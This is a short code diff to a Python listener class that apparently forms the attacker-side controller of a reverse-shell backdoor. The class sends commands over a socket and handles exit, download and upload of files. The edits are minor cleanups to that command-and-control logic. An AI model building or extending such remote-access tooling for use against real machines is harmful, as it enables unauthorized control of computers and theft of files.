@@ -5,6 +5,7 @@ import base64
 import json
 import os
 import socket
+import sys
 
 import chardet
 
@@ -37,7 +38,7 @@ class Listener:
         self.reliable_send(command)
         if command[0] == "exit":
             self.connection.close()
-            exit()
+            sys.exit()
         elif command[0] == "download" and len(command) > 1:
             return self.receive_file(command[1])
         elif command[0] == "upload" and len(command) > 1:
@@ -45,8 +46,10 @@ class Listener:
 
         return self.reliable_receive()
 
-
     def receive_file(self, path):
+        # if os.path.exists(path):
+        #     return "[-] Such file exists"
+
         total_receive = 0
         file = open(path, "wb")
         while True:
